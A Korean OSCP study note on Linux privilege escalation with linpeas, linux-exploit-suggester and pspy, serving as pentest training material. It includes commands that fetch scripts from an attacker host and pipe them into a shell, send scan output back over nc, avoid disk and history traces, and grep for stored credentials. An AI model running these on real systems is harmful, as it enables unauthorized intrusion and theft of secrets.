# 01_linpeas_자동화도구

# 리눅스 권한상승 — 자동화 도구

---

## linpeas (가장 강력, OSCP 필수)

```bash
locate linpeas.sh
# 보통 /usr/share/peass/linpeas/linpeas.sh 또는 /opt/linpeas.sh
cd /usr/share/peass/linpeas/   # 또는 linpeas.sh가 있는 디렉터리
python3 -m http.server 8000

# 피해자 — 메모리 직접 실행 (흔적 없음)
curl http://<칼리IP>:8000/linpeas.sh | bash
wget -O - http://<칼리IP>:8000/linpeas.sh | bash

# 파일로 저장
wget http://<칼리IP>:8000/linpeas.sh -O /tmp/lpe.sh
chmod +x /tmp/lpe.sh

# 실행
/tmp/linpeas.sh -a > /tmp/out.txt 2>&1
```

### 색상 의미

- **빨강/노랑 배경** = 95% 이상 익스플로잇 가능 → 즉시 확인
- **빨강** = 중요 정보, 반드시 검토
- **노랑** = 유용한 정보

### 주요 확인 섹션

```
[+] Sudo version          → sudo CVE 확인
[+] Sudo tokens           → NOPASSWD 항목, GTFOBins 대조
[+] SUID Files            → GTFOBins 검색
[+] SGID Files            → 그룹 권한 획득 경로
[+] Capabilities          → cap_setuid 등 확인
[+] Cron jobs             → 쓰기 가능한 스크립트 확인
[+] Writable passwd files → /etc/passwd 직접 수정
[+] NFS                   → no_root_squash 확인
[+] Interesting GROUP     → docker, lxd, adm 등 특수 그룹 소속
[+] Kernel version        → 커널 익스플로잇 후보 (-a 옵션 필요)
```

---

## 실행 방법 다양하게 (상황별)

```bash
# curl 없이 nc로 전송 (victim에 curl/wget 둘 다 없을 때)
nc -q 5 -lvnp 80 < linpeas.sh              # 칼리
cat < /dev/tcp/<칼리IP>/80 | sh             # 대상

# 메모리에서만 실행하고 결과를 다시 칼리로 흘려보내기 (디스크에 흔적 없음)
nc -lvnp 9002 | tee linpeas.out                          # 칼리
curl <칼리IP>:8000/linpeas.sh | sh | nc <칼리IP> 9002    # 대상

./linpeas.sh -n                            # -n : 실행 명령어가 히스토리에 안 남게
./linpeas.sh -a > /dev/shm/linpeas.txt      # 색상 유지한 채 저장
less -R /dev/shm/linpeas.txt                # 색상 그대로 다시 보기
```

`-a` 없이 기본 실행만으로 90% 이상 발견됨. `-a`는 linux-exploit-suggester DB 조회 등 2~3분 더 걸리는 심화체크라, 시간 급하면 기본 먼저 돌리고 안 나오면 그때 재실행.

---

## grep으로 발견 항목별 분석

```bash
# 색상 기반 우선순위 추출
grep -aE $'\033[1;31;103m' /tmp/out.txt          # red-on-yellow만 추출 → linpeas가 95%+ 확신한다고 표시한 것만 바로 보기
grep -aE $'\033[1;31m' /tmp/out.txt              # 순수 빨강 → 확신도는 낮지만 사람이 직접 검토할 가치 있는 항목
cat /tmp/out.txt | sed -r "s/\x1B\[[0-9;]*[mK]//g" > /tmp/out_clean.txt  # 색상 코드 제거 → 다른 곳에 붙여넣거나 다시 읽기 편하게

# sudo / NOPASSWD
grep -A 10 "Sudo version" /tmp/out.txt           # 버전 확보 → CVE-2021-3156 같은 알려진 sudo 자체 취약점과 대조
grep -B 2 -A 15 "sudo -l" /tmp/out.txt           # sudo -l 결과 전체 → (ALL:ALL) ALL 이면 이미 root, 더 볼 필요 없음
grep -iE "NOPASSWD|\(ALL\)|\(ALL : ALL\)" /tmp/out.txt   # NOPASSWD 뒤 바이너리명 확인 → GTFOBins에 등록된 것이면 바로 적용

# SUID/SGID
grep -A 30 "SUID" /tmp/out.txt | grep -E "^-rwsr|--->"   # ---> 붙은 줄 = linpeas가 GTFOBins와 이미 자동 대조해서 익스플로잇 기법까지 알려준 것
grep -B 1 -A 1 "GTFOBins" /tmp/out.txt           # 매칭된 바이너리가 배포판 기본값인지 비정상인지 구분 → 비정상이면 우선 확인

# Capabilities
grep -A 20 "Capabilities" /tmp/out.txt           # SUID보다 눈에 덜 띄는 설정이라 관리자가 실수로 남겨두기 쉬움
grep -i "cap_setuid\|cap_setgid\|cap_dac_read\|cap_sys_admin" /tmp/out.txt   # 이 네 개가 실전에서 바로 root로 이어지는 대표 값

# Cron / 스케줄
grep -A 15 "Cron" /tmp/out.txt                   # root가 돌리는 작업인지, 그 스크립트에 내가 쓸 권한이 있는지가 핵심
grep -B 2 -A 2 "writable" /tmp/out.txt | grep -i cron   # writable 결과가 워낙 많으니 cron과 겹치는 것만 좁혀서 실제 권한상승 경로만 남김

# 그룹 / 컨테이너
grep -A 5 "Interesting GROUP" /tmp/out.txt       # docker/lxd는 사실상 root와 동등, adm은 로그 읽기 권한
grep -iE "docker|lxd|adm|disk|video" /tmp/out.txt | grep -i group   # id 결과만으로 놓친 그룹을 여기서 한 번 더 교차확인

# 크리덴셜 / 패스워드
grep -iE "password|credential|api[_-]?key|token" /tmp/out.txt | grep -v "^\s*#"   # 설정파일·스크립트에 하드코딩된 값, 주석줄은 제외해서 노이즈 줄임

# 커널 / 익스플로잇
grep -A 20 "Kernel" /tmp/out.txt                 # 버전 번호만 보고 판단 금지 → 배포판이 백포트 패치했을 수 있음, 실제 익스플로잇 시도로 검증
grep -i "CVE-" /tmp/out.txt                      # 나온 CVE 번호로 searchsploit 바로 검색해서 PoC 유무 확인

# 여러 카테고리 한 번에
grep -iE "NOPASSWD|SUID|cap_set|writable.*cron|docker group|lxd group" /tmp/out.txt   # 시간 없을 때 이 한 줄만 돌려서 우선순위 상위 항목부터 훑기
```

`-A`(after) `-B`(before) `-C`(both)는 헤더 줄만 매치되고 실제 내용은 다음 줄에 있는 linpeas 출력 특성상 항상 같이 써야 함.

---

## 빌드 종류 차이

```
linpeas.sh        # 기본, linux-exploit-suggester만 내장
linpeas_fat.sh    # 서드파티 도구까지 base64로 통째 내장, 오프라인 환경 유리
linpeas_small.sh  # 핵심 체크만, 은신/속도 중시
```

---

## linux-exploit-suggester

```bash
wget http://<칼리IP>/linux-exploit-suggester.sh -O /tmp/les.sh
chmod +x /tmp/les.sh
/tmp/les.sh

wget http://<칼리IP>/linux-exploit-suggester-2.pl
perl linux-exploit-suggester-2.pl
```

---

## pspy (cron 실시간 모니터링)

root 권한 없이 실행 중인 프로세스와 cron job 실시간 모니터링.

```bash
wget http://<칼리IP>/pspy64 -O /tmp/pspy64
chmod +x /tmp/pspy64
/tmp/pspy64             # 실시간 출력
/tmp/pspy64 -i 1000     # 1초 간격 (기본 100ms)
/tmp/pspy64 -pf         # 프로세스 + 파일 이벤트
```

---

## 수동 열거 기본 명령

```bash
id; whoami; groups
uname -a                   # 커널 버전
cat /etc/issue; cat /etc/os-release
sudo -l                    # ★★★ 최우선
sudo -V                    # sudo 버전
env; echo $PATH
ps aux | grep root
netstat -antlup 2>/dev/null
cat /etc/passwd; cat /etc/crontab
cat ~/.bash_history
getcap -r / 2>/dev/null
```